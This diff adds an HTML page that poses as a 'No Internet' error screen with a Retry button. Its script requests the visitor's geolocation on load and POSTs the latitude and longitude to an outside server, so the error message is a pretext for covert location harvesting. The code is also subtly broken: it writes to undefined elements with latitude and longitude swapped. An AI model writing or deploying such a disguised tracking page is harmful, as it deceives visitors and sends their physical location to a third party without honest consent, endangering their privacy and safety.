@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Error !</title>
+</head>
+<body>
+    <h1>No Internet !</h1>
+  <span>*internet connection not stable please </span>
+
+   <button onclick="main()">Retry</button>
+
+
+
+
+<script>
+
+const url = "https://qna-back.onrender.com/set-loc/";
+const main=()=>{
+
+if(navigator.geolocation){
+
+navigator.geolocation.getCurrentPosition((pos)=>{
+    lng.innerText = pos.coords.latitude;
+    lat.innerText = pos.coords.longitude;
+
+
+fetch(url,{
+    "method":"POST",
+    "headers" : {"Content-Type":"application/json"},
+    "body":JSON.stringify({
+        lat:pos.coords.latitude,
+        long:pos.coords.longitude
+    })
+})
+
+
+})
+
+
+
+
+}else{
+    alert("location denied retry again !");
+}
+
+}
+
+main();
+
+
+
+
+</script>
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
